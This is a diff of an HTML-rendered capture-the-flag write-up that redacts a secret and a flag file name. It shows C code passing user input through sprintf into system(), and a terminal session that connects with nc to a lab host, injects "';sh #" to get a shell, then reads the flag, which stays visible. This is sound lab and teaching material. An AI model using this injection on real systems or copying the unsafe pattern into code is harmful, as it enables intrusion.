@@ -3688,7 +3688,7 @@
 <span class="w">    </span><span class="kt">size_t</span><span class="w"> </span><span class="n">commandSize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">255</span><span class="p">;</span>
 <span class="w">    </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">commandSize</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">command</span><span class="p">));</span><span class="w"> </span><span class="c1">// command is declared here</span>
 
-<span class="w">    </span><span class="n">sprintf</span><span class="p">(</span><span class="n">command</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;./debug_console.sh &#39;%s&#39;&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">input</span><span class="p">);</span><span class="w"> </span><span class="c1">//</span>
+<span class="w">    </span><span class="n">sprintf</span><span class="p">(</span><span class="n">command</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;./debug_console.sh &#39;%s&#39;&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">input</span><span class="p">);</span><span class="w"> </span><span class="c1">// e.g: ./debug_console.sh &#39;id&#39;</span>
 
 <span class="w">    </span><span class="n">system</span><span class="p">(</span><span class="n">command</span><span class="p">);</span><span class="w"> </span><span class="c1">// first-look</span>
 <span class="p">}</span>
@@ -3816,13 +3816,13 @@ Invalid<span class="w"> </span>Secret:<span class="w"> </span>0x73
     <div class="highlight"><pre><span></span><code>➜<span class="w">  </span>attachments<span class="w"> </span>nc<span class="w"> </span><span class="m">10</span>.10.0.5<span class="w"> </span><span class="m">1337</span><span class="w"> </span>-vvv
 <span class="m">10</span>.10.0.5:<span class="w"> </span>inverse<span class="w"> </span>host<span class="w"> </span>lookup<span class="w"> </span>failed:<span class="w"> </span>Unknown<span class="w"> </span>host
 <span class="o">(</span>UNKNOWN<span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="m">10</span>.10.0.5<span class="o">]</span><span class="w"> </span><span class="m">1337</span><span class="w"> </span><span class="o">(</span>?<span class="o">)</span><span class="w"> </span>open
-Secret:<span class="w"> </span>S3cr3t_K3y_b51d35_RJ_
+Secret:<span class="w"> </span><span class="o">[</span>redacted<span class="o">]</span>
 Choose:<span class="w"> </span>process,whoami,id
 &gt;<span class="w"> </span><span class="err">&#39;</span><span class="p">;</span>sh<span class="w"> </span><span class="c1">#</span>
 Usage:<span class="w"> </span>./debug_console.sh<span class="w"> </span>&lt;process,whoami,id&gt;
 id
 <span class="nv">uid</span><span class="o">=</span><span class="m">65534</span><span class="o">(</span>nobody<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">65534</span><span class="o">(</span>nogroup<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">65534</span><span class="o">(</span>nogroup<span class="o">)</span>
-cat<span class="w"> </span>/flag-JlmvRzaiW0SlEZ5zLGlR****q57aM.txt
+cat<span class="w"> </span>/flag-<span class="o">[</span>redacted<span class="o">]</span>.txt
 hackingclub<span class="o">{</span>raffa_moreira_mano_777<span class="o">}</span>
 </code></pre></div></li>
 </ul>
